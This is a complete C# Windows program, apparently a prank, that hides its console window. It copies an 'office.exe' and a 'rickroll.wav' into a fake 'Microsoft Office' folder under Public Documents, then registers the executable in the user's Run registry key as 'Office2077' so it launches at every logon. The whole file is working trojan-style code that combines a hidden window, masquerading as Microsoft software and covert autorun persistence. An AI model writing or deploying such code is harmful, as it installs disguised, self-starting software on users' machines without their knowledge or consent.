using System;
using System.Diagnostics;
using System.Runtime;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Threading;
namespace Startprogram
{
	class Pogram
	{
		[DllImport("Kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();
		[DllImport("User32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
		static void Main(string[] args)
		{
			IntPtr hWnd = GetConsoleWindow();
			if(hWnd != IntPtr.Zero)
			{
				ShowWindow(hWnd, 0);
			}
			if (Directory.Exists(@"C:\Users\Public\Documents\Microsoft Office") == true)
			{
				string path = @"office.exe";
				string path1 = @"C:\Users\Public\Documents\Microsoft Office\office.exe";
				string path2 = @"rickroll.wav";
				string path3 = @"C:\Users\Public\Documents\Microsoft Office\rickroll.wav";
				File.Copy(path, path1);
				File.Copy(path2, path3);
			} 
			else
			{
				Directory.CreateDirectory(@"C:\Users\Public\Documents\Microsoft Office");
				string path = @"office.exe";
				string path1 = @"C:\Users\Public\Documents\Microsoft Office\office.exe";
				string path2 = @"rickroll.wav";
				string path3 = @"C:\Users\Public\Documents\Microsoft Office\rickroll.wav";
				File.Copy(path, path1);
				File.Copy(path2, path3);
			}
				RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
				key.SetValue("Office2077", @"C:\Users\Public\Documents\Microsoft Office\office.exe");
		}
	}
}
